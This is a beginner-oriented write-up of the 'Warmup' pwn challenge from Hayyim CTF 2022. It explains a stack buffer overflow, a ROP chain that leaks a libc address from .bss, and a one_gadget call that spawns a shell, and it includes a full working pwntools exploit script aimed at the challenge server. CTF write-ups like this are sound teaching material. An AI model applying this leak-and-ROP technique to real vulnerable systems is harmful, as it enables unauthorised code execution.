#### **Warmup,**

.

well..

as its name indicates Warmup was a warmup pwn challenge from Hayyim CTF 2022.

Hayyim CTF had very good challenges, but I did not have time to participate..(I was working on defcamp CTF at the same time)

I will do a small write up for people beginning with pwn, as it is very simple to exploit actually..

ok, so we have this small program, with an obvious buffer overflow, and very few gadgets..

let's look at the reverse:

![IDA Reverse](https://github.com/nobodyisnobody/write-ups/raw/main/Hayyim.CTF.2022/pwn/warmup/pics/reverse.png)

ok , we can see that the vuln function, reserve 0x30 bytes on stack for his input,

and read 0xC0 bytes in it from the user..  obviously too much..

We will do the exploitation in two rounds, but the payload will be send in one time.

At the end of the vulnerable function, stack is increased of 0x30 bytes, than rbx is popped from stack, and there is the ret.

![.bss memory](https://github.com/nobodyisnobody/write-ups/raw/main/Hayyim.CTF.2022/pwn/warmup/pics/memory.png)

When examining the .bss memory above, you can see that there are 3 libc addresses that we can leak, stdin, stdout & stderr,

and one thing important too, that memory zone is writable (it is .bss)

What we do first, is to set rbx to points to 8 bytes before stderr, at 0x601018, then we return to 0x40055d.

At the end of the vuln function, rdi, rsi and rdx are set correctly by the last read, so when we jump to 0x40055d,

the content of the stack will be dumped, and just after the call to write, rsi will be set to the value in rbx that we set before.

So now, the next read will be on this zone pointed by rbx (and now rsi) , that is the address 8 bytes before stderr on bss.

So with the next read, we fill the 8 bytes before stderr, and stop just before. We send just 8 bytes this time so..

And our ROP; return again to 0x40055d, so that time the value of stderr will be leaked.

see the leaked stderr libc address , after the 8 chars 'A' we sent:

![leaked stderr address](https://github.com/nobodyisnobody/write-ups/raw/main/Hayyim.CTF.2022/pwn/warmup/pics/leak.png)

With that value, we will calculate the remote libc mapping address.

and this time we will return to the beginning of the vuln function at 0x40053d, to set rsi to point on stack again..

and to send our last payload, that will contain only a single onegadget value.

We could also have send a system('/bin/sh') now that we know libc remote address...

here is the exploit so...

```python3
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

exe = ELF('./warmup')
libc = ELF('./libc.so.6')

host, port = "141.164.48.191", "10001"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)


# 1st round , set rbx = 0x601018 point 8bytes before stderr address on .bss
payload = 'A'*0x30+p64(0x601018)+p64(0x40055d)+p64(0)*6
# 2nd round, now rsi will point to 0x601018 (that we pass at the 1st round in rbx, and we will dump stderr value)
payload += p64(0x601018)+p64(0x40055d)+p64(0)*6+p64(0x601018)+p64(0x40053d)

p.sendafter('> ', payload)
buff  = p.recv(0xc0)

# write 8 bytes just before stderr address on .bss
p.send('A'*8)
# receive out stderr leak
buff  = p.recv(0xc0)
print(hexdump(buff))
leak = u64(buff[0x8:0x10])
print('leak = '+hex(leak))
libc.address = leak - libc.symbols['_IO_2_1_stderr_']
print('libc.address = '+hex(libc.address))

# write again 8 bytes just before stderr address on .bss
p.send('A'*8)

# now that we know remote libc mapping address, we send a onegadget for our final payload, that will do system('/bin/sh')
onegadgets = one_gadget('libc.so.6', libc.address)
payload = 'A'*0x30+p64(0x601018)+p64(onegadgets[1])+p64(0)*10
p.sendafter('> ', payload)

# enjoy shell
p.interactive()
```

seeing is believing...

![shell is coming..!!](https://github.com/nobodyisnobody/write-ups/raw/main/Hayyim.CTF.2022/pwn/warmup/pics/gotshell.gif)

*nobodyisnobody still pwning things*  (like a ghost in the machine..)



